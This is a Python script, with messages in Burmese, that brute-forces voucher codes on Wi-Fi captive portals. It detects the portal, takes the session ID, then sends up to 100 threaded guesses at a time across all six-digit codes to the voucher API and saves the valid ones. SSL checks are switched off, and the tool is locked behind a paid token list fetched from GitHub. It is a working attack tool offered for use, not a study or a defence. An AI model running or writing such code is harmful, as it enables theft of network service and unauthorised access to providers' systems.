import requests
import re
import urllib3
import time
import threading
import random
from datetime import datetime, timedelta
import sys
import os
import ssl

# --- SSL ERROR FIX ---
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
KEYS_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
TRIED_CODES_FILE = "tried_codes.txt"
SUCCESS_CODES_FILE = "success.txt"
CODE_TO_TEST = "536884" 
VOUCHER_THREADS = 100 

# --- CLEAR SCREEN FUNCTION ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- CACHE MANAGEMENT ---
def load_tried_codes():
    if not os.path.exists(TRIED_CODES_FILE):
        return set()
    with open(TRIED_CODES_FILE, "r") as f:
        return set(line.strip() for line in f)

def save_tried_code(code):
    with open(TRIED_CODES_FILE, "a") as f:
        f.write(f"{code}\n")

def save_success_code(code):
    with open(SUCCESS_CODES_FILE, "a") as f:
        f.write(f"{code}\n")

# --- TOKEN LICENSE SYSTEM ---
def check_license():
    clear_screen()
    print("========================================")
    print("       🔑 TOKEN ACCESS SYSTEM         ")
    print("========================================\n")
    
    try:
        url_with_cache_buster = f"{KEYS_URL}?t={int(time.time())}"
        response = requests.get(url_with_cache_buster, timeout=5)
        lines = response.text.splitlines()
        with open("keys_local.txt", "w") as f:
            f.write(response.text)
    except:
        if os.path.exists("keys_local.txt"):
            with open("keys_local.txt", "r") as f:
                lines = f.readlines()
        else:
            print("❌ အင်တာနက်မရှိပါ၊ Local Keys လည်းမရှိပါ။")
            return False
        
    user_token = input("👉 သင့် Token ကိုရိုက်ထည့်ပါ: ")
    
    for line in lines:
        if "|" not in line or line.startswith("#"): continue
        try:
            key, start_date_str, unit, amount = line.split("|")
            start_date = datetime.strptime(start_date_str, "%Y-%m-%d")
            amount = int(amount)
        except: continue
        
        if key == user_token:
            if unit == 'd':
                end_date = start_date + timedelta(days=amount)
            elif unit == 'h':
                end_date = start_date + timedelta(hours=amount)
            elif unit == 'm':
                end_date = start_date + timedelta(minutes=amount)
            else:
                return False
            
            remaining = end_date - datetime.now()
            
            if remaining.total_seconds() <= 0:
                print("\n❌ သက်တမ်းကုန်ဆုံးသွားပါပြီ။")
                return False
            else:
                print(f"\n✅ သက်တမ်းရှိသည်။ ကုန်ဆုံးချိန်: {end_date}")
                time.sleep(2)
                return True
            
    print("\n❌ Token မှားယွင်းနေပါသည်။")
    return False

# --- MENU SYSTEM ---
def show_menu():
    clear_screen()
    print("========================================")
    print("         🛠️  MAIN MENU                ")
    print("========================================")
    print("1. 🌐 Internet Access")
    print(f"2. 🔍 Fast Random Voucher Harvesting")
    print(f"3. 🔍 Test Specific Code: {CODE_TO_TEST}")
    print("4. 📋 View Success Codes")
    print("========================================\n")
    choice = input("👉 ရွေးချယ်ပါ (1-4): ")
    return choice

# --- PORTAL AUTO DETECT ---
def get_portal_info():
    """Captive Portal URL ကို အလိုအလျောက်ရှာဖွေခြင်း"""
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = requests.get(test_url, allow_redirects=True, timeout=5)
        if r.url != test_url:
            from urllib.parse import urlparse
            parsed = urlparse(r.url)
            return f"{parsed.scheme}://{parsed.netloc}", r.url
    except:
        pass
    return None, None

# --- FAST RANDOM VOUCHER HARVESTING LOGIC ---
def test_code(code, portal_host, sid, session):
    """တစ်ခုချင်းစီကို Thread နဲ့စမ်းသပ်သည့် function"""
    voucher_api = f"{portal_host}/api/auth/voucher/"
    try:
        # --- API CALL စမ်းသပ်သည့်နေရာ ---
        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
        
        if v_res.status_code == 200 and "success" in v_res.text.lower():
            # SUCCESS အစိမ်းရောင်တန်းကျလာမည်
            print(f"\n\033[92m✅ SUCCESS! Found Code: {code}\033[0m")
            save_success_code(code)
            return True
    except:
        pass
    
    save_tried_code(code)
    # Fail ဖြစ်ပါက ဘာမှမပြဘဲနေမည် (Silent)
    return False

def start_voucher_harvesting():
    print(f"\n🔍 Voucher Code ရှာဖွေခြင်း အရှိန်မြှင့် စတင်ပြီ...")
    tried_codes = load_tried_codes()
    print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")

    portal_host, portal_url = get_portal_info()
    if not portal_host:
        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။ WiFi သေချာချိတ်ပါ။")
        return

    # SID ယူခြင်း
    session = requests.Session()
    r2 = session.get(portal_url, verify=False, timeout=10)
    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
    sid = sid_match.group(1) if sid_match else "unknown"

    threads = []
    
    # 000000 ကနေ 999999 ထိ Random ယူမည်
    all_codes = list(range(1000000))
    random.shuffle(all_codes) # --- RANDOM လုပ်ခြင်း ---

    for code_int in all_codes:
        code = f"{code_int:06d}"
        if code in tried_codes:
            continue
        
        # Thread အများကြီးနဲ့ စမ်းသပ်ခြင်း
        t = threading.Thread(target=test_code, args=(code, portal_host, sid, session))
        threads.append(t)
        t.start()
        
        # Threads အရေအတွက် ထိန်းချုပ်ခြင်း
        if len(threads) >= VOUCHER_THREADS:
            for t in threads:
                t.join()
            threads = []
            
        print(f"\r🔍 Random စမ်းသပ်နေသည်: {code}", end="", flush=True)

# --- SPECIFIC CODE TESTER ---
def test_specific_code():
    print(f"\n🔍 စမ်းသပ်နေသည်: {CODE_TO_TEST} ...")
    
    portal_host, portal_url = get_portal_info()
    if not portal_host:
        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။ WiFi သေချာချိတ်ပါ။")
        return

    # SID ယူခြင်း
    session = requests.Session()
    r2 = session.get(portal_url, verify=False, timeout=10)
    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
    sid = sid_match.group(1) if sid_match else "unknown"
    
    voucher_api = f"{portal_host}/api/auth/voucher/"
    
    try:
        v_res = session.post(voucher_api, json={'accessCode': CODE_TO_TEST, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
        
        if v_res.status_code == 200 and "success" in v_res.text.lower():
            print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {CODE_TO_TEST}\033[0m")
            save_success_code(CODE_TO_TEST)
        else:
            print(f"\n❌ FAIL! Invalid Code: {CODE_TO_TEST}")
            
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    time.sleep(3)

# --- MAIN RUNNER ---
if __name__ == "__main__":
    if check_license():
        choice = show_menu()
        if choice == '1':
            print("\n🌐 Internet Access... (Logic implementation needed)")
        elif choice == '2':
            start_voucher_harvesting()
        elif choice == '3':
            test_specific_code()
        elif choice == '4':
            print("\n📋 Success Code များ:")
            if os.path.exists(SUCCESS_CODES_FILE):
                with open(SUCCESS_CODES_FILE, "r") as f:
                    print(f.read())
            else:
                print("No success codes found.")
            time.sleep(5)
        else:
            print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
            
